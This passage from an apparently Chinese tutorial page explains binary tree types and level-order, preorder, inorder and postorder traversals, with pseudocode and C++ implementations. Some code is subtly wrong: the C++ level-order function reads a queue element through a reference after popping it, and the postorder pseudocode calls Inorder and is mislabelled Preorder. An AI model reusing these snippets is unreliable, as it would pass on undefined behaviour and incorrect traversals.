<li>平衡二叉树（<code>balanced</code>）：每个节点的左、右子树的高度差不超过<code>1</code>。</li>
<li>退化二叉树（<code>degenerate</code>）：每个父节点只有<code>1</code>个子节点。这意味着树的行为类似于链表数据结构。</li>
</ul>
</li>
<li>遍历<ul>
<li>广度优先（<code>breadthFirst</code>）：逐层访问每个节点（例如从上到下、从左向右）。</li>
<li>深度优先（<code>depthFirst</code>）：尽可能先访问最深处的节点，规定移动方向从左向右。<ul>
<li>前序遍历（<code>preorder</code>）：<code>VLR</code>–先访问节点，然后遍历左子树，最后遍历右子树。</li>
<li>中序遍历（<code>inorder</code>）：<code>LVR</code>–先遍历左子树，然后访问节点，最后遍历右子树。</li>
<li>后序遍历（<code>postorder</code>）：<code>LRV</code>–先遍历左子树，然后遍历右子树，最后访问节点。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><div class="tabs" id="binarytree"><ul class="nav-tabs"><li class="tab active"><a href="#binarytree-1">breadthFirst</a></li><li class="tab"><a href="#binarytree-2">depthFirst</a></li></ul><div class="tab-content"><div class="tab-pane active" id="binarytree-1"><ul>
<li>规则：访问下一个节点前，会优先横向搜索同一个层级的节点。适合<strong>队列</strong>实现。</li>
</ul>
<div class="tabs" id="breadthfirst"><ul class="nav-tabs"><li class="tab active"><a href="#breadthfirst-1">levelorder</a></li></ul><div class="tab-content"><div class="tab-pane active" id="breadthfirst-1"><ul>
<li>规则： 从根节点开始，按照自顶向下、自左向右的顺序，逐层访问每个节点。</li>
<li>应用： <a href="#%E5%A0%86"><strong>堆</strong></a>的遍历。</li>
</ul>
<div class="tabs" id="levelordercode"><ul class="nav-tabs"><li class="tab active"><a href="#levelordercode-1">Pseudo</a></li><li class="tab"><a href="#levelordercode-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="levelordercode-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BTree</span><br><span class="line">    root: BNode，=nul</span><br><span class="line">    <span class="comment"># 层次遍历</span></span><br><span class="line">    Levelorder()</span><br><span class="line">        Q: queue&lt;BNode&gt;</span><br><span class="line">        x: BNode, =nul</span><br><span class="line">        Q &lt;- root</span><br><span class="line">        <span class="keyword">while</span> Q.NotEmpty</span><br><span class="line">            x &lt;- Q</span><br><span class="line">            Visit(x.e)</span><br><span class="line">            <span class="keyword">if</span> x.L.Exist</span><br><span class="line">                Q &lt;- x.L</span><br><span class="line">            <span class="keyword">if</span> x.R.Exist</span><br><span class="line">                Q &lt;- x.R</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="levelordercode-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BNode</span> &#123;</span><br><span class="line">    <span class="keyword">typedef</span> shared_ptr&lt;BNode&gt; PBNode;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    PBNode L;</span><br><span class="line">    PBNode R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BTree</span> &#123;</span><br><span class="line">    <span class="keyword">typedef</span> shared_ptr&lt;BNode&gt; PBNode;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">levelorder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        queue&lt;PBNode&gt; Q;</span><br><span class="line">        Q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span>&amp; x = Q.<span class="built_in">front</span>();</span><br><span class="line">            Q.<span class="built_in">pop</span>();</span><br><span class="line">            cout &lt;&lt; x-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;L)</span><br><span class="line">                Q.<span class="built_in">push</span>(x-&gt;L);</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;R)</span><br><span class="line">                Q.<span class="built_in">push</span>(x-&gt;R);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    PBNode root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div></div></div></div></div><div class="tab-pane" id="binarytree-2"><ul>
<li>规则<br>访问下一个兄弟节点前，会尽可能的增加节点深度。适合<strong>栈</strong>实现。</li>
</ul>
<div class="tabs" id="depthfirst"><ul class="nav-tabs"><li class="tab active"><a href="#depthfirst-1">preorder</a></li><li class="tab"><a href="#depthfirst-2">inorder</a></li><li class="tab"><a href="#depthfirst-3">postorder</a></li></ul><div class="tab-content"><div class="tab-pane active" id="depthfirst-1"><ul>
<li>规则<ol>
<li>从<strong>根节点</strong>开始，按照从上到下、从左到右的顺序，<strong>每次前进或后退一个节点</strong>，即是前序遍历的路径。</li>
<li>各节点在路径中<strong>第一次出现的位置</strong>即是前序遍历的结果。</li>
</ol>
</li>
</ul>
<div class="tabs" id="preordercode"><ul class="nav-tabs"><li class="tab active"><a href="#preordercode-1">Pseudo</a></li><li class="tab"><a href="#preordercode-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="preordercode-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BTree</span><br><span class="line">    root: BNode，=nul</span><br><span class="line">    <span class="comment"># 前序遍历（递归）</span></span><br><span class="line">    Preorder(x)</span><br><span class="line">        <span class="keyword">if</span> x.Exist</span><br><span class="line">            Visit(x.e)</span><br><span class="line">            Preorder(x.L)</span><br><span class="line">            Preorder(x.R)</span><br><span class="line">    <span class="comment"># 前序遍历（迭代1）</span></span><br><span class="line">    Preorder()</span><br><span class="line">        S: stack&lt;BNode&gt;</span><br><span class="line">        x: BNode, =nul</span><br><span class="line">        S &lt;- root</span><br><span class="line">        <span class="keyword">while</span> S.NotEmpty</span><br><span class="line">            x &lt;- S</span><br><span class="line">            Visit(x.e)</span><br><span class="line">            <span class="keyword">if</span> x.R.Exist</span><br><span class="line">                S &lt;- x.R</span><br><span class="line">            <span class="keyword">if</span> x.L.Exist</span><br><span class="line">                S &lt;- x.L</span><br><span class="line">    <span class="comment"># 前序遍历（迭代2）</span></span><br><span class="line">    Preorder()</span><br><span class="line">        OP &#123;T:travel, V:visit&#125;</span><br><span class="line">        OPNode &#123;OP, BNode&#125;</span><br><span class="line">        S: stack&lt;OPNode&gt;</span><br><span class="line">        x: OPNode, =nul</span><br><span class="line">        S &lt;- &#123;T, root&#125;</span><br><span class="line">        <span class="keyword">while</span> S.NotEmpty</span><br><span class="line">            x &lt;- S</span><br><span class="line">            <span class="keyword">if</span> x.OP == T</span><br><span class="line">                S &lt;- &#123;T, x.BNode.R&#125;</span><br><span class="line">                S &lt;- &#123;T, x.BNode.L&#125;</span><br><span class="line">                S &lt;- &#123;V, x.BNode&#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Visit(x.BNode.e)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="preordercode-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BNode</span>(<span class="type">int</span> e, shared_ptr&lt;BNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">preorder</span><span class="params">(shared_ptr&lt;BNode&gt; x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x) &#123;</span><br><span class="line">            cout &lt;&lt; x-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="built_in">preorder</span>(x-&gt;L);</span><br><span class="line">            <span class="built_in">preorder</span>(x-&gt;R);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">preorder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">        stack&lt;shared_ptr&lt;BNode&gt;&gt; S;</span><br><span class="line">        S.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!S.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">            cout &lt;&lt; x-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;R)</span><br><span class="line">                S.<span class="built_in">push</span>(x-&gt;R);</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;L)</span><br><span class="line">                S.<span class="built_in">push</span>(x-&gt;L);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">preorder2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">        stack&lt;shared_ptr&lt;ONode&gt;&gt; S;</span><br><span class="line">        S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, root));</span><br><span class="line">        <span class="keyword">while</span> (!S.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;o == ONode::T) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;b-&gt;R)</span><br><span class="line">                    S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, x-&gt;b-&gt;R));</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;b-&gt;L)</span><br><span class="line">                    S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, x-&gt;b-&gt;L));</span><br><span class="line">                S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::V, x-&gt;b));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; x-&gt;b-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ONode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">Operate</span> &#123;T, V&#125;;</span><br><span class="line">        <span class="built_in">ONode</span>(Operate o, shared_ptr&lt;BNode&gt; b) : <span class="built_in">o</span>(o), <span class="built_in">b</span>(b) &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Operate o;</span><br><span class="line">        shared_ptr&lt;BNode&gt; b;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div></div><div class="tab-pane" id="depthfirst-2"><ul>
<li>规则<ul>
<li>从<strong>最左侧节点</strong>开始，遇到<strong>带右子树的节点</strong>时，立即跳到其右子树的最左侧，否则，向上遍历直至遇到带右子树的新节点，遍历至<strong>最右侧节点</strong>时终止。</li>
</ul>
</li>
<li>应用<ul>
<li><a href="/Algorithm/Sort#%E6%A0%91%E6%8E%92%E5%BA%8F"><strong>树排序</strong></a>算法。</li>
</ul>
</li>
</ul>
<div class="tabs" id="inordercode"><ul class="nav-tabs"><li class="tab active"><a href="#inordercode-1">Pseudo</a></li><li class="tab"><a href="#inordercode-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="inordercode-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BTree</span><br><span class="line">    root: BNode，=nul</span><br><span class="line">    <span class="comment"># 中序遍历（递归）</span></span><br><span class="line">    Inorder(x)</span><br><span class="line">        <span class="keyword">if</span> x.Exist</span><br><span class="line">            Inorder(x.L)</span><br><span class="line">            Visit(x.e)</span><br><span class="line">            Inorder(x.R)</span><br><span class="line">    <span class="comment"># 中序遍历（迭代1）</span></span><br><span class="line">    Inorder()</span><br><span class="line">        S: stack&lt;BNode&gt;</span><br><span class="line">        x: BNode, =root</span><br><span class="line">        <span class="keyword">while</span> S.NotEmpty or x.Exist</span><br><span class="line">            <span class="keyword">if</span> x.Exist</span><br><span class="line">                S &lt;- x</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                x &lt;- S</span><br><span class="line">                Visit(x.e)</span><br><span class="line">                x = x.R</span><br><span class="line">    <span class="comment"># 中序遍历（迭代2）</span></span><br><span class="line">    Inorder()</span><br><span class="line">        OP &#123;T:travel, V:visit&#125;</span><br><span class="line">        OPNode &#123;OP, BNode&#125;</span><br><span class="line">        S: stack&lt;OPNode&gt;</span><br><span class="line">        x: OPNode, =nul</span><br><span class="line">        S &lt;- &#123;T, root&#125;</span><br><span class="line">        <span class="keyword">while</span> S.NotEmpty</span><br><span class="line">            x &lt;- S</span><br><span class="line">            <span class="keyword">if</span> x.OP == T</span><br><span class="line">                S &lt;- &#123;T, x.BNode.R&#125;</span><br><span class="line">                S &lt;- &#123;V, x.BNode&#125;</span><br><span class="line">                S &lt;- &#123;T, x.BNode.L&#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Visit(x.BNode.e)</span><br><span class="line">    <span class="comment"># 中序遍历（迭代3）</span></span><br><span class="line">    Inorder()</span><br><span class="line">        S: stack&lt;BNode&gt;</span><br><span class="line">        x: BNode, =root</span><br><span class="line">        <span class="comment"># 遍历树中所有的右子树节点（包括根节点）</span></span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            <span class="comment"># 自顶向左遍历，依次把右子树和当前节点入栈，直至最左边节点入栈完成</span></span><br><span class="line">            <span class="keyword">while</span> x.Exist</span><br><span class="line">                <span class="keyword">if</span> x.R.Exist</span><br><span class="line">                    S &lt;- x.R</span><br><span class="line">                S &lt;- x</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="comment"># 从最左边节点开始向顶出栈，直至第一个带右子树的节点出栈完成</span></span><br><span class="line">            x &lt;- S</span><br><span class="line">            <span class="keyword">while</span> S.NotEmpty and x.R.NotExist</span><br><span class="line">                Visit(x.e)</span><br><span class="line">                x &lt;- S</span><br><span class="line">            Visit(x.e)</span><br><span class="line">            <span class="comment"># 栈为空，说明自顶向左的入栈的所有节点均没有右子树，即遍历完成</span></span><br><span class="line">            <span class="keyword">if</span> S.Empty</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 将当前节点的右子树节点出栈</span></span><br><span class="line">            x &lt;- S</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="inordercode-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BNode</span>(<span class="type">int</span> e, shared_ptr&lt;BNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder</span><span class="params">(shared_ptr&lt;BNode&gt; x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x) &#123;</span><br><span class="line">            <span class="built_in">inorder</span>(x-&gt;L);</span><br><span class="line">            cout &lt;&lt; x-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="built_in">inorder</span>(x-&gt;R);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">        stack&lt;shared_ptr&lt;BNode&gt;&gt; S;</span><br><span class="line">        <span class="keyword">auto</span> x = root;</span><br><span class="line">        <span class="keyword">while</span> (!S.<span class="built_in">empty</span>() || x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x) &#123;</span><br><span class="line">                S.<span class="built_in">push</span>(x);</span><br><span class="line">                x = x-&gt;L;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                x = S.<span class="built_in">top</span>();</span><br><span class="line">                S.<span class="built_in">pop</span>();</span><br><span class="line">                cout &lt;&lt; x-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">                x = x-&gt;R;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">        stack&lt;shared_ptr&lt;ONode&gt;&gt; S;</span><br><span class="line">        S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, root));</span><br><span class="line">        <span class="keyword">while</span> (!S.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> x = S.<span class="built_in">top</span>();</span><br><span class="line">            S.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (x-&gt;o == ONode::T) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;b-&gt;R)</span><br><span class="line">                    S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, x-&gt;b-&gt;R));</span><br><span class="line">                S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::V, x-&gt;b));</span><br><span class="line">                <span class="keyword">if</span> (x-&gt;b-&gt;L)</span><br><span class="line">                    S.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;ONode&gt;(ONode::T, x-&gt;b-&gt;L));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; x-&gt;b-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ONode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">enum</span> <span class="title class_">Operate</span> &#123;T, V&#125;;</span><br><span class="line">        <span class="built_in">ONode</span>(Operate o, shared_ptr&lt;BNode&gt; b) : <span class="built_in">o</span>(o), <span class="built_in">b</span>(b) &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Operate o;</span><br><span class="line">        shared_ptr&lt;BNode&gt; b;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    shared_ptr&lt;BNode&gt; root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div></div><div class="tab-pane" id="depthfirst-3"><ul>
<li>规则<ol>
<li>从<strong>最左侧叶子节点</strong>开始，顺着<strong>邻近叶子节点</strong>逐渐向最右侧叶子节点遍历。</li>
<li>在上述过程中，当发现自身是<strong>父节点的右节点</strong>或者自身是<strong>最右侧的叶子节点</strong>时，向上遍历至父节点，否则，向右遍历至下一个叶子节点。</li>
</ol>
</li>
</ul>
<div class="tabs" id="postordercode"><ul class="nav-tabs"><li class="tab active"><a href="#postordercode-1">Pseudo</a></li><li class="tab"><a href="#postordercode-2">C++</a></li></ul><div class="tab-content"><div class="tab-pane active" id="postordercode-1"><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">BNode</span><br><span class="line">    e: value of node</span><br><span class="line">    L: left subtree</span><br><span class="line">    <span class="built_in">R</span>: right subtree</span><br><span class="line">BTree</span><br><span class="line">    root: BNode，=nul</span><br><span class="line">    <span class="comment"># 后序遍历（递归）</span></span><br><span class="line">    Postorder(x)</span><br><span class="line">        <span class="keyword">if</span> x.Exist</span><br><span class="line">            Inorder(x.L)</span><br><span class="line">            Inorder(x.R)</span><br><span class="line">            Visit(x.e)</span><br><span class="line">    <span class="comment"># 后序遍历（迭代1）</span></span><br><span class="line">    Postorder()</span><br><span class="line">        S: stack&lt;BNode&gt;</span><br><span class="line">        x: BNode, =root</span><br><span class="line">        y: BNode, =nul</span><br><span class="line">        z: BNode, =nul</span><br><span class="line">        <span class="keyword">while</span> S.NotEmpty or x.Exist</span><br><span class="line">            <span class="keyword">if</span> x.Exist</span><br><span class="line">                <span class="comment"># 向左至最左侧节点入栈</span></span><br><span class="line">                S &lt;- x</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment"># 瞥一眼栈顶节点</span></span><br><span class="line">                z = S.top()</span><br><span class="line">                <span class="keyword">if</span> z.R.Exist and z.R != y</span><br><span class="line">                    <span class="comment"># 有右子树且在向下遍历至叶子节点过程中</span></span><br><span class="line">                    x = z.R</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment"># 无右子树，说明是叶子节点，对应规则2的向右遍历</span></span><br><span class="line">                    <span class="comment"># 右子树节点在前一次出栈，对应规则2的向上遍历</span></span><br><span class="line">                    Visit(z.e)</span><br><span class="line">                    <span class="comment"># 将栈顶元素出栈</span></span><br><span class="line">                    y &lt;- S</span><br><span class="line">    <span class="comment"># 后序遍历（迭代2）</span></span><br><span class="line">    Preorder()</span><br><span class="line">        OP &#123;T:travel, V:visit&#125;</span><br><span class="line">        OPNode &#123;OP, BNode&#125;</span><br><span class="line">        S: stack&lt;OPNode&gt;</span><br><span class="line">        x: OPNode, =nul</span><br><span class="line">        S &lt;- &#123;T, root&#125;</span><br><span class="line">        <span class="keyword">while</span> S.NotEmpty</span><br><span class="line">            x &lt;- S</span><br><span class="line">            <span class="keyword">if</span> x.OP == T</span><br><span class="line">                S &lt;- &#123;V, x.BNode&#125;</span><br><span class="line">                S &lt;- &#123;T, x.BNode.R&#125;</span><br><span class="line">                S &lt;- &#123;T, x.BNode.L&#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Visit(x.BNode.e)</span><br><span class="line">    <span class="comment"># 后序遍历（迭代3）</span></span><br><span class="line">    Postorder()</span><br><span class="line">        S: stack&lt;BNode&gt;</span><br><span class="line">        x: BNode, =root</span><br><span class="line">        y: BNode, =nul</span><br><span class="line">        <span class="keyword">while</span> x.Exist</span><br><span class="line">            <span class="comment"># 向左至最左侧节点的父节点入栈</span></span><br><span class="line">            <span class="keyword">while</span> x.L.Exist</span><br><span class="line">                S &lt;- x</span><br><span class="line">                x = x.L</span><br><span class="line">            <span class="comment"># 无右子树，说明是叶子节点，对应规则2的向右遍历</span></span><br><span class="line">            <span class="comment"># 右子树节点在前一次出栈，对应规则2的向上遍历</span></span><br><span class="line">            <span class="keyword">while</span> x.R.NotExist or x.R == y</span><br><span class="line">                Visit(x.e)</span><br><span class="line">                y = x</span><br><span class="line">                <span class="keyword">if</span> S.Empty</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                x &lt;- S</span><br><span class="line">            <span class="comment"># 最左侧节点入栈</span></span><br><span class="line">            S &lt;- x</span><br><span class="line">            <span class="comment"># 当前节点更新为右侧节点</span></span><br><span class="line">            x = x.R</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="postordercode-2"><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BNode</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">BNode</span>(<span class="type">int</span> e, shared_ptr&lt;BNode&gt; L = <span class="literal">nullptr</span>, shared_ptr&lt;BNode&gt; R = <span class="literal">nullptr</span>)</span><br><span class="line">        : <span class="built_in">e</span>(e), <span class="built_in">L</span>(L), <span class="built_in">R</span>(R) &#123;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    shared_ptr&lt;BNode&gt; L;</span><br><span class="line">    shared_ptr&lt;BNode&gt; R;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">postorder</span><span class="params">(shared_ptr&lt;BNode&gt; x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x) &#123;</span><br><span class="line">            <span class="built_in">postorder</span>(x-&gt;L);</span><br><span class="line">            <span class="built_in">postorder</span>(x-&gt;R);</span><br><span class="line">            cout &lt;&lt; x-&gt;e &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">postorder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">        stack&lt;shared_ptr&lt;BNode&gt;&gt; S;</span><br><span class="line">        <span class="keyword">auto</span> x = root;</span><br><span class="line">        <span class="keyword">decltype</span>(x) y = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span> (!S.<span class="built_in">empty</span>() || x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x) &#123;</span><br><span class="line">                S.<span class="built_in">push</span>(x);</span><br><span class="line">                x = x-&gt;L;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">auto</span> z = S.<span class="built_in">top</span>();</span><br><span class="line">                <span class="keyword">if</span> (z-&gt;R &amp;&amp; z-&gt;R != y) &#123;</span><br><span class="line">                    x = z-&gt;R;</span><br><span class="line">                &#125; <span class="keyword">else</span> 